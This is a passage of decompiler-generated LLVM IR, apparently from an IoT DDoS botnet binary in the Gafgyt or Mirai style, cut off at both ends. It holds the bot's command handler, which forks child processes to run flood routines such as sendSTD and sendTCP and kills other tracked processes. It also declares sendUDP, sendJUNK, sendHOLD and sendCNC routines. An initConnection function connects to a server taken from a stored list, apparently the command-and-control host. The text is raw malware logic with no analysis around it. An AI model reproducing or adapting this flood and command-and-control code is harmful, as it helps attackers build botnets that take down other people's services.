  %v7_12628 = icmp slt i32 %arg1, 4
  br i1 %v7_12628, label %dec_label_pc_12bf0, label %dec_label_pc_1262c

dec_label_pc_1262c:                               ; preds = %dec_label_pc_12620
  %v1_12630 = add i32 %tmp, 8
  %v1_12634 = inttoptr i32 %v1_12630 to i32*
  %v2_12634 = load i32, i32* %v1_12634, align 4
  store i32 %v2_12634, i32* @r0, align 4
  %v1_1263c = call i32 @atol(i32 %v2_12634)
  %tmp135 = icmp slt i32 %v1_1263c, 1
  br i1 %tmp135, label %dec_label_pc_12bf0, label %dec_label_pc_1264c

dec_label_pc_1264c:                               ; preds = %dec_label_pc_1262c
  %v1_12650 = add i32 %tmp, 12
  %v1_12654 = inttoptr i32 %v1_12650 to i32*
  %v2_12654 = load i32, i32* %v1_12654, align 4
  store i32 %v2_12654, i32* @r0, align 4
  %v1_1265c = call i32 @atol(i32 %v2_12654)
  %v5_12668 = icmp sgt i32 %v1_1265c, 0
  br i1 %v5_12668, label %dec_label_pc_12670, label %dec_label_pc_12bf0

dec_label_pc_12670:                               ; preds = %dec_label_pc_1264c
  %v1_12674 = add i32 %tmp, 4
  %v1_12678 = inttoptr i32 %v1_12674 to i32*
  %v2_12678 = load i32, i32* %v1_12678, align 4
  %v2_12688 = load i32, i32* %v1_12634, align 4
  store i32 %v2_12688, i32* @r0, align 4
  %v1_12690 = call i32 @atol(i32 %v2_12688)
  %v2_126a4 = load i32, i32* %v1_12654, align 4
  store i32 %v2_126a4, i32* @r0, align 4
  %v1_126ac = call i32 @atol(i32 %v2_126a4)
  %v2_126c4 = call i32 @__GI_strchr(i32 %v2_12678, i32 44)
  %v2_126cc = icmp eq i32 %v2_126c4, 0
  br i1 %v2_126cc, label %dec_label_pc_1273c, label %dec_label_pc_126d4

dec_label_pc_126d4:                               ; preds = %dec_label_pc_12670
  store i32 %v2_12678, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_126e0 = call i32 @__GI_strtok(i32 %v2_12678, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_1273040 = icmp eq i32 %v2_126e0, 0
  br i1 %v2_1273040, label %dec_label_pc_12764, label %dec_label_pc_126f0

dec_label_pc_126f0:                               ; preds = %dec_label_pc_126d4, %dec_label_pc_12718
  %storemerge1641 = phi i32 [ %v2_12720, %dec_label_pc_12718 ], [ %v2_126e0, %dec_label_pc_126d4 ]
  %v0_126f0 = call i32 @listFork()
  %v2_126f8 = icmp eq i32 %v0_126f0, 0
  br i1 %v2_126f8, label %dec_label_pc_12700, label %dec_label_pc_12718

dec_label_pc_12700:                               ; preds = %dec_label_pc_126f0
  %v3_1270c = call i32 @sendSTD(i32 %storemerge1641, i32 %v1_12690, i32 %v1_126ac)
  %v1_12714 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12718:                               ; preds = %dec_label_pc_126f0
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_12720 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_12730 = icmp eq i32 %v2_12720, 0
  br i1 %v2_12730, label %dec_label_pc_12764, label %dec_label_pc_126f0

dec_label_pc_1273c:                               ; preds = %dec_label_pc_12670
  %v0_1273c = call i32 @listFork()
  %v2_12744 = icmp eq i32 %v0_1273c, 0
  br i1 %v2_12744, label %dec_label_pc_1274c, label %dec_label_pc_12bf0

dec_label_pc_1274c:                               ; preds = %dec_label_pc_1273c
  %v3_12758 = call i32 @sendSTD(i32 %v2_12678, i32 %v1_12690, i32 %v1_126ac)
  %v1_12760 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12764:                               ; preds = %dec_label_pc_12718, %dec_label_pc_126d4, %dec_label_pc_12600
  %v2_12768 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23f34.1246 to i32), i32* @r1, align 4
  %v3_12774 = inttoptr i32 %v2_12768 to i8*
  %v4_12774 = call i32 @__GI_strcoll(i8* %v3_12774, i32 ptrtoint ([4 x i8]* @global_var_23f34.1246 to i32))
  %v2_1277c = icmp eq i32 %v4_12774, 0
  br i1 %v2_1277c, label %dec_label_pc_12784, label %dec_label_pc_12ab0

dec_label_pc_12784:                               ; preds = %dec_label_pc_12764
  %v7_1278c = icmp slt i32 %arg1, 6
  br i1 %v7_1278c, label %dec_label_pc_12bf0, label %dec_label_pc_12790

dec_label_pc_12790:                               ; preds = %dec_label_pc_12784
  %v1_12794 = add i32 %tmp, 12
  %v1_12798 = inttoptr i32 %v1_12794 to i32*
  %v2_12798 = load i32, i32* %v1_12798, align 4
  store i32 %v2_12798, i32* @r0, align 4
  %v1_127a0 = call i32 @atol(i32 %v2_12798)
  %v7_127a8 = icmp eq i32 %v1_127a0, -1
  br i1 %v7_127a8, label %dec_label_pc_12bf0, label %dec_label_pc_127b0

dec_label_pc_127b0:                               ; preds = %dec_label_pc_12790
  %v1_127b4 = add i32 %tmp, 8
  %v1_127b8 = inttoptr i32 %v1_127b4 to i32*
  %v2_127b8 = load i32, i32* %v1_127b8, align 4
  store i32 %v2_127b8, i32* @r0, align 4
  %v1_127c0 = call i32 @atol(i32 %v2_127b8)
  %v7_127c8 = icmp eq i32 %v1_127c0, -1
  br i1 %v7_127c8, label %dec_label_pc_12bf0, label %dec_label_pc_127d0

dec_label_pc_127d0:                               ; preds = %dec_label_pc_127b0
  %v1_127d4 = add i32 %tmp, 16
  %v1_127d8 = inttoptr i32 %v1_127d4 to i32*
  %v2_127d8 = load i32, i32* %v1_127d8, align 4
  store i32 %v2_127d8, i32* @r0, align 4
  %v1_127e0 = call i32 @atol(i32 %v2_127d8)
  %v7_127e8 = icmp eq i32 %v1_127e0, -1
  br i1 %v7_127e8, label %dec_label_pc_12bf0, label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127d0
  %v2_127f8 = load i32, i32* %v1_127d8, align 4
  store i32 %v2_127f8, i32* @r0, align 4
  %v1_12800 = call i32 @atol(i32 %v2_127f8)
  %v8_1280c = icmp sgt i32 %v1_12800, 32
  br i1 %v8_1280c, label %dec_label_pc_12bf0, label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %dec_label_pc_127f0
  %v7_12818 = icmp slt i32 %arg1, 7
  br i1 %v7_12818, label %dec_label_pc_1283c, label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_12810
  %v1_12820 = add i32 %tmp, 24
  %v1_12824 = inttoptr i32 %v1_12820 to i32*
  %v2_12824 = load i32, i32* %v1_12824, align 4
  store i32 %v2_12824, i32* @r0, align 4
  %v1_1282c = call i32 @atol(i32 %v2_12824)
  %v1_12834 = icmp slt i32 %v1_1282c, 0
  br i1 %v1_12834, label %dec_label_pc_12bf0, label %dec_label_pc_1283c

dec_label_pc_1283c:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_12810
  %v7_12840 = icmp eq i32 %arg1, 8
  br i1 %v7_12840, label %dec_label_pc_12848, label %dec_label_pc_128e8

dec_label_pc_12848:                               ; preds = %dec_label_pc_1283c
  %v1_1284c = add i32 %tmp, 28
  %v1_12850 = inttoptr i32 %v1_1284c to i32*
  %v2_12850 = load i32, i32* %v1_12850, align 4
  store i32 %v2_12850, i32* @r0, align 4
  %v1_12858 = call i32 @atol(i32 %v2_12850)
  %v5_12864 = icmp sgt i32 %v1_12858, 0
  br i1 %v5_12864, label %dec_label_pc_128e8, label %dec_label_pc_12bf0

dec_label_pc_128e8:                               ; preds = %dec_label_pc_1283c, %dec_label_pc_12848
  %v1_128ec = add i32 %tmp, 4
  %v1_128f0 = inttoptr i32 %v1_128ec to i32*
  %v2_128f0 = load i32, i32* %v1_128f0, align 4
  %v2_12900 = load i32, i32* %v1_127b8, align 4
  store i32 %v2_12900, i32* @r0, align 4
  %v1_12908 = call i32 @atol(i32 %v2_12900)
  %v2_1291c = load i32, i32* %v1_12798, align 4
  store i32 %v2_1291c, i32* @r0, align 4
  %v1_12924 = call i32 @atol(i32 %v2_1291c)
  %v2_12938 = load i32, i32* %v1_127d8, align 4
  store i32 %v2_12938, i32* @r0, align 4
  %v1_12940 = call i32 @atol(i32 %v2_12938)
  %v1_12950 = add i32 %tmp, 20
  %v1_12954 = inttoptr i32 %v1_12950 to i32*
  %v2_12954 = load i32, i32* %v1_12954, align 4
  br i1 %v7_12840, label %dec_label_pc_12968, label %dec_label_pc_12984

dec_label_pc_12968:                               ; preds = %dec_label_pc_128e8
  %v1_1296c = add i32 %tmp, 28
  %v1_12970 = inttoptr i32 %v1_1296c to i32*
  %v2_12970 = load i32, i32* %v1_12970, align 4
  store i32 %v2_12970, i32* @r0, align 4
  %v1_12978 = call i32 @atol(i32 %v2_12970)
  br label %dec_label_pc_1298c

dec_label_pc_12984:                               ; preds = %dec_label_pc_128e8
  br label %dec_label_pc_1298c

dec_label_pc_1298c:                               ; preds = %dec_label_pc_12968, %dec_label_pc_12984
  %storemerge3 = phi i32 [ 10, %dec_label_pc_12984 ], [ %v1_12978, %dec_label_pc_12968 ]
  br i1 %v7_12818, label %dec_label_pc_129bc, label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_1298c
  %v1_129a4 = add i32 %tmp, 24
  %v1_129a8 = inttoptr i32 %v1_129a4 to i32*
  %v2_129a8 = load i32, i32* %v1_129a8, align 4
  store i32 %v2_129a8, i32* @r0, align 4
  %v1_129b0 = call i32 @atol(i32 %v2_129a8)
  br label %dec_label_pc_129c4

dec_label_pc_129bc:                               ; preds = %dec_label_pc_1298c
  br label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %dec_label_pc_129a0, %dec_label_pc_129bc
  %storemerge2 = phi i32 [ 0, %dec_label_pc_129bc ], [ %v1_129b0, %dec_label_pc_129a0 ]
  %v2_129d8 = call i32 @__GI_strchr(i32 %v2_128f0, i32 44)
  %v2_129e0 = icmp eq i32 %v2_129d8, 0
  br i1 %v2_129e0, label %dec_label_pc_12a6c, label %dec_label_pc_129e8

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129c4
  store i32 %v2_128f0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_129f4 = call i32 @__GI_strtok(i32 %v2_128f0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_12a6037 = icmp eq i32 %v2_129f4, 0
  br i1 %v2_12a6037, label %dec_label_pc_12ab0, label %dec_label_pc_12a04

dec_label_pc_12a04:                               ; preds = %dec_label_pc_129e8, %dec_label_pc_12a48
  %storemerge1438 = phi i32 [ %v2_12a50, %dec_label_pc_12a48 ], [ %v2_129f4, %dec_label_pc_129e8 ]
  %v0_12a04 = call i32 @listFork()
  %v2_12a0c = icmp eq i32 %v0_12a04, 0
  br i1 %v2_12a0c, label %dec_label_pc_12a14, label %dec_label_pc_12a48

dec_label_pc_12a14:                               ; preds = %dec_label_pc_12a04
  %v7_12a3c = call i32 @sendTCP(i32 %storemerge1438, i32 %v1_12908, i32 %v1_12924, i32 %v1_12940, i32 %v2_12954, i32 %storemerge2, i32 %storemerge3)
  %v1_12a44 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12a48:                               ; preds = %dec_label_pc_12a04
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_12a50 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_12a60 = icmp eq i32 %v2_12a50, 0
  br i1 %v2_12a60, label %dec_label_pc_12ab0, label %dec_label_pc_12a04

dec_label_pc_12a6c:                               ; preds = %dec_label_pc_129c4
  %v0_12a6c = call i32 @listFork()
  %v2_12a74 = icmp eq i32 %v0_12a6c, 0
  br i1 %v2_12a74, label %dec_label_pc_12a7c, label %dec_label_pc_12bf0

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a6c
  %v7_12aa4 = call i32 @sendTCP(i32 %v2_128f0, i32 %v1_12908, i32 %v1_12924, i32 %v1_12940, i32 %v2_12954, i32 %storemerge2, i32 %storemerge3)
  %v1_12aac = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12a48, %dec_label_pc_129e8, %dec_label_pc_12764
  %v2_12ab4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_23f38.1248 to i32), i32* @r1, align 4
  %v3_12ac0 = inttoptr i32 %v2_12ab4 to i8*
  %v4_12ac0 = call i32 @__GI_strcoll(i8* %v3_12ac0, i32 ptrtoint ([5 x i8]* @global_var_23f38.1248 to i32))
  %v2_12ac8 = icmp eq i32 %v4_12ac0, 0
  br i1 %v2_12ac8, label %dec_label_pc_12ad0, label %dec_label_pc_12bc8

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12ab0
  br label %dec_label_pc_12b74

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12b74, %dec_label_pc_12ba8
  %v3_12ae8 = mul i32 %storemerge12, 4
  %v2_12af4 = load i32, i32* @global_var_346c0.64, align 4
  %v2_12af8 = add i32 %v2_12af4, %v3_12ae8
  %v1_12afc = inttoptr i32 %v2_12af8 to i32*
  %v2_12afc = load i32, i32* %v1_12afc, align 4
  %v2_12b00 = icmp eq i32 %v2_12afc, 0
  br i1 %v2_12b00, label %dec_label_pc_12b68, label %dec_label_pc_12b08

dec_label_pc_12b08:                               ; preds = %dec_label_pc_12ae4
  %v2_12b20 = load i32, i32* %v1_12afc, align 4
  store i32 %v2_12b20, i32* @r4, align 4
  %v0_12b24 = call i32 @getpid()
  %v0_12b2c = load i32, i32* @r4, align 4
  %v9_12b2c = icmp eq i32 %v0_12b2c, %v0_12b24
  br i1 %v9_12b2c, label %dec_label_pc_12b68, label %dec_label_pc_12b34

dec_label_pc_12b34:                               ; preds = %dec_label_pc_12b08
  %v0_12b58 = call i32 @kill()
  %v1_12b60 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_12b68

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b08, %dec_label_pc_12ae4, %dec_label_pc_12b34
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_12ae4 ], [ %stack_var_-44.1, %dec_label_pc_12b08 ], [ %v1_12b60, %dec_label_pc_12b34 ]
  %v1_12b6c = add i32 %storemerge12, 1
  br label %dec_label_pc_12b74

dec_label_pc_12b74:                               ; preds = %dec_label_pc_12ad0, %dec_label_pc_12b68
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_12ad0 ], [ %stack_var_-44.0, %dec_label_pc_12b68 ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_12ad0 ], [ %v1_12b6c, %dec_label_pc_12b68 ]
  %v5_12b8c = load i32, i32* @global_var_2e464.62, align 4
  %v9_12ba0 = icmp eq i32 %v5_12b8c, 0
  br i1 %v9_12ba0, label %dec_label_pc_12ba8, label %dec_label_pc_12ae4

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12b74
  %v2_12b8c = load i32, i32* @global_var_2e460.61, align 4
  %tmp150 = icmp ugt i32 %v2_12b8c, %storemerge12
  br i1 %tmp150, label %dec_label_pc_12ae4, label %dec_label_pc_12bc8

dec_label_pc_12bc8:                               ; preds = %dec_label_pc_12ba8, %dec_label_pc_12ab0
  %v2_12bcc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_23f40.1252 to i32), i32* @r1, align 4
  %v3_12bd8 = inttoptr i32 %v2_12bcc to i8*
  %v4_12bd8 = call i32 @__GI_strcoll(i8* %v3_12bd8, i32 ptrtoint ([12 x i8]* @global_var_23f40.1252 to i32))
  %v2_12be0 = icmp eq i32 %v4_12bd8, 0
  br i1 %v2_12be0, label %dec_label_pc_12be8, label %dec_label_pc_12bf0

dec_label_pc_12be8:                               ; preds = %dec_label_pc_12bc8
  %v1_12bec = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12848, %dec_label_pc_1264c, %dec_label_pc_12498, %dec_label_pc_12324, %dec_label_pc_11f28, %dec_label_pc_11d00, %dec_label_pc_11b9c, %dec_label_pc_11c8c, %dec_label_pc_11e00, %dec_label_pc_1209c, %dec_label_pc_12224, %dec_label_pc_12424, %dec_label_pc_125b8, %dec_label_pc_1273c, %dec_label_pc_12a6c, %dec_label_pc_12bc8, %dec_label_pc_11b00, %dec_label_pc_11a90, %dec_label_pc_1281c, %dec_label_pc_127f0, %dec_label_pc_127d0, %dec_label_pc_127b0, %dec_label_pc_12790, %dec_label_pc_12784, %dec_label_pc_1262c, %dec_label_pc_12620, %dec_label_pc_12478, %dec_label_pc_1246c, %dec_label_pc_12304, %dec_label_pc_122f8, %dec_label_pc_120f8, %dec_label_pc_11efc, %dec_label_pc_11ed4, %dec_label_pc_11eb4, %dec_label_pc_11e94, %dec_label_pc_11e74, %dec_label_pc_11e54, %dec_label_pc_11e48, %dec_label_pc_11ce0, %dec_label_pc_11cd4, %dec_label_pc_11b7c, %dec_label_pc_11b70, %dec_label_pc_11a28, %dec_label_pc_11ab8, %dec_label_pc_119ec, %dec_label_pc_118f0, %dec_label_pc_118b8, %dec_label_pc_12be8
  %v24_12bf4 = phi i32 [ %v1_12858, %dec_label_pc_12848 ], [ %v1_1265c, %dec_label_pc_1264c ], [ %v1_124a8, %dec_label_pc_12498 ], [ %v1_12334, %dec_label_pc_12324 ], [ %v1_11f38, %dec_label_pc_11f28 ], [ %v1_11d10, %dec_label_pc_11d00 ], [ %v1_11bac, %dec_label_pc_11b9c ], [ %v0_11c8c, %dec_label_pc_11c8c ], [ %v0_11e00, %dec_label_pc_11e00 ], [ %v0_1209c, %dec_label_pc_1209c ], [ %v0_12224, %dec_label_pc_12224 ], [ %v0_12424, %dec_label_pc_12424 ], [ %v0_125b8, %dec_label_pc_125b8 ], [ %v0_1273c, %dec_label_pc_1273c ], [ %v0_12a6c, %dec_label_pc_12a6c ], [ %v4_12bd8, %dec_label_pc_12bc8 ], [ 0, %dec_label_pc_11b00 ], [ 0, %dec_label_pc_11a90 ], [ %v1_1282c, %dec_label_pc_1281c ], [ %v1_12800, %dec_label_pc_127f0 ], [ %v1_127e0, %dec_label_pc_127d0 ], [ %v1_127c0, %dec_label_pc_127b0 ], [ %v1_127a0, %dec_label_pc_12790 ], [ 0, %dec_label_pc_12784 ], [ %v1_1263c, %dec_label_pc_1262c ], [ 0, %dec_label_pc_12620 ], [ %v1_12488, %dec_label_pc_12478 ], [ 0, %dec_label_pc_1246c ], [ %v1_12314, %dec_label_pc_12304 ], [ 0, %dec_label_pc_122f8 ], [ 0, %dec_label_pc_120f8 ], [ %v1_11f0c, %dec_label_pc_11efc ], [ %v1_11ee4, %dec_label_pc_11ed4 ], [ %v1_11ec4, %dec_label_pc_11eb4 ], [ %v1_11ea4, %dec_label_pc_11e94 ], [ %v1_11e84, %dec_label_pc_11e74 ], [ %v1_11e64, %dec_label_pc_11e54 ], [ 0, %dec_label_pc_11e48 ], [ %v1_11cf0, %dec_label_pc_11ce0 ], [ 0, %dec_label_pc_11cd4 ], [ %v1_11b8c, %dec_label_pc_11b7c ], [ 0, %dec_label_pc_11b70 ], [ 0, %dec_label_pc_11a28 ], [ %v0_11aa0, %dec_label_pc_11ab8 ], [ %v3_119fc, %dec_label_pc_119ec ], [ %v3_11914, %dec_label_pc_118f0 ], [ %v3_118c8, %dec_label_pc_118b8 ], [ %v1_12bec, %dec_label_pc_12be8 ]
  store i32 %v3_11884, i32* @r4, align 4
  store i32 %v6_11884, i32* @r5, align 4
  store i32 %v9_11884, i32* @r6, align 4
  store i32 %v12_11884, i32* @r7, align 4
  store i32 %v15_11884, i32* @r8, align 4
  store i32 %v18_11884, i32* @fp, align 4
  ret i32 %v24_12bf4

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32 %v2_12a50, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_12940, { 1, 0 }
  uselistorder i32 %v1_12924, { 1, 0 }
  uselistorder i32 %v1_12908, { 1, 0 }
  uselistorder i32 %v2_128f0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_127e0, { 1, 0 }
  uselistorder i32 %v1_127c0, { 1, 0 }
  uselistorder i32 %v1_127a0, { 1, 0 }
  uselistorder i32 %v2_12720, { 1, 0 }
  uselistorder i32 %v1_126ac, { 1, 0 }
  uselistorder i32 %v1_12690, { 1, 0 }
  uselistorder i32 %v2_12678, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1259c, { 1, 0 }
  uselistorder i32 %v1_124f8, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v1_124dc, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_124c4, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v2_12408, { 1, 0 }
  uselistorder i32 %v1_12384, { 1, 0 }
  uselistorder i32 %v1_12368, { 1, 0 }
  uselistorder i32 %v2_12350, { 2, 1, 0, 3 }
  uselistorder i32* %v1_1210c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_12080, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_11fa4, { 1, 0 }
  uselistorder i32 %v1_11f88, { 1, 0 }
  uselistorder i32 %v1_11f6c, { 1, 0 }
  uselistorder i32 %v2_11f54, { 2, 1, 0, 3 }
  uselistorder i32 %v1_11ec4, { 1, 0 }
  uselistorder i32 %v1_11ea4, { 1, 0 }
  uselistorder i32 %v1_11e84, { 1, 0 }
  uselistorder i32 %v1_11e64, { 1, 0 }
  uselistorder i32 %v2_11de4, { 1, 0 }
  uselistorder i32 %v1_11d60, { 1, 0 }
  uselistorder i32 %v1_11d44, { 1, 0 }
  uselistorder i32 %v2_11d2c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_11c70, { 1, 0 }
  uselistorder i32 %v1_11bfc, { 1, 0 }
  uselistorder i32 %v1_11be0, { 1, 0 }
  uselistorder i32 %v2_11bc8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23e40.1184 to i32), { 7, 18, 8, 19, 6, 20, 9, 21, 5, 22, 10, 23, 4, 24, 11, 25, 3, 26, 12, 27, 2, 28, 13, 29, 1, 30, 14, 31, 0, 32, 15, 33, 16, 34, 17, 35 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_23ee0.1225 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_346bc.1221, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1f934.57 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_12bf0, { 47, 15, 14, 0, 18, 19, 20, 21, 22, 23, 13, 1, 24, 25, 12, 2, 26, 27, 11, 3, 28, 29, 10, 30, 9, 4, 31, 32, 33, 34, 35, 36, 37, 8, 5, 38, 39, 7, 6, 40, 41, 16, 43, 17, 42, 44, 45, 46 }
  uselistorder label %dec_label_pc_12b74, { 1, 0 }
  uselistorder label %dec_label_pc_12b68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ae4, { 1, 0 }
  uselistorder label %dec_label_pc_12a04, { 1, 0 }
  uselistorder label %dec_label_pc_129c4, { 1, 0 }
  uselistorder label %dec_label_pc_1298c, { 1, 0 }
  uselistorder label %dec_label_pc_128e8, { 1, 0 }
  uselistorder label %dec_label_pc_126f0, { 1, 0 }
  uselistorder label %dec_label_pc_1253c, { 1, 0 }
  uselistorder label %dec_label_pc_123c8, { 1, 0 }
  uselistorder label %dec_label_pc_1214c, { 1, 0 }
  uselistorder label %dec_label_pc_1203c, { 1, 0 }
  uselistorder label %dec_label_pc_11ffc, { 1, 0 }
  uselistorder label %dec_label_pc_11f4c, { 1, 0 }
  uselistorder label %dec_label_pc_11da4, { 1, 0 }
  uselistorder label %dec_label_pc_11c40, { 1, 0 }
  uselistorder label %dec_label_pc_11a6c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12bfc = load i32, i32* @fp, align 4
  store i32 76804, i32* %stack_var_-4, align 4
  %v2_12c00 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12c00, i32* @fp, align 4
  %v2_12c14 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_12c24 = bitcast i32* %stack_var_-4116 to i8*
  %v3_12c24 = call i32 @__GI_memset(i8* %v2_12c24, i32 0)
  %v2_12c2c = load i32, i32* @global_var_2e45c.55, align 4
  %v2_12c30 = icmp eq i32 %v2_12c2c, 0
  br i1 %v2_12c30, label %dec_label_pc_12c54, label %dec_label_pc_12c38

dec_label_pc_12c38:                               ; preds = %entry
  %v1_12c44 = call i32 @__GI_close(i32 %v2_12c2c)
  store i32 0, i32* @global_var_2e45c.55, align 4
  br label %dec_label_pc_12c54

dec_label_pc_12c54:                               ; preds = %entry, %dec_label_pc_12c38
  %v2_12c58 = load i32, i32* @global_var_2e15c.1255, align 4
  %v2_12c5c = icmp eq i32 %v2_12c58, 0
  br i1 %v2_12c5c, label %dec_label_pc_12c88, label %dec_label_pc_12c74

dec_label_pc_12c74:                               ; preds = %dec_label_pc_12c54
  %v1_12c7c = add i32 %v2_12c58, 1
  br label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c54, %dec_label_pc_12c74
  %storemerge1 = phi i32 [ %v1_12c7c, %dec_label_pc_12c74 ], [ 0, %dec_label_pc_12c54 ]
  store i32 %storemerge1, i32* @global_var_2e15c.1255, align 4
  %v4_12ca0 = mul i32 %storemerge1, 4
  %v5_12ca0 = add i32 %v4_12ca0, ptrtoint ([15 x i8]** @global_var_2e028.1258 to i32)
  %v6_12ca0 = inttoptr i32 %v5_12ca0 to i32*
  %v7_12ca0 = load i32, i32* %v6_12ca0, align 4
  store i32 %v7_12ca0, i32* @r1, align 4
  %v3_12cac = call i32 @strcpy(i8* %v2_12c24, i32 %v7_12ca0)
  %v2_12cb4 = load i32, i32* @global_var_2e02c.1260, align 4
  %v2_12cd0 = call i32 @__GI_strchr(i32 %v2_12c14, i32 58)
  %v2_12cd8 = icmp eq i32 %v2_12cd0, 0
  br i1 %v2_12cd8, label %dec_label_pc_12d38, label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12c88
  %v2_12cf4 = call i32 @__GI_strchr(i32 %v2_12c14, i32 58)
  %v1_12cfc = add i32 %v2_12cf4, 1
  store i32 %v1_12cfc, i32* @r0, align 4
  %v1_12d04 = call i32 @atol(i32 %v1_12cfc)
  %v2_12d24 = call i32 @__GI_strchr(i32 %v2_12c14, i32 58)
  %v3_12d34 = inttoptr i32 %v2_12d24 to i8*
  store i8 0, i8* %v3_12d34, align 1
  br label %dec_label_pc_12d38

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12c88, %dec_label_pc_12ce0
  %stack_var_-20.0 = phi i32 [ %v2_12cb4, %dec_label_pc_12c88 ], [ %v1_12d04, %dec_label_pc_12ce0 ]
  %v0_12d44 = call i32 @socket()
  store i32 %v0_12d44, i32* @global_var_2e45c.55, align 4
  %v4_12d78 = call i32 @connectTimeout(i32 %v0_12d44, i32 %v2_12c14, i32 %stack_var_-20.0, i32 30)
  %v2_12d80 = icmp eq i32 %v4_12d78, 0
  %. = zext i1 %v2_12d80 to i32
  store i32 %v3_12bfc, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_12c14, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_12d38, { 1, 0 }
  uselistorder label %dec_label_pc_12c88, { 1, 0 }
  uselistorder label %dec_label_pc_12c54, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12dcc = load i32, i32* @fp, align 4
  store i32 %v3_12dcc, i32* %stack_var_-16, align 4
  %v0_12de8 = call i32 @socket()
  %v3_12df8 = icmp eq i32 %v0_12de8, -1
  br i1 %v3_12df8, label %dec_label_pc_12e00, label %dec_label_pc_12e10

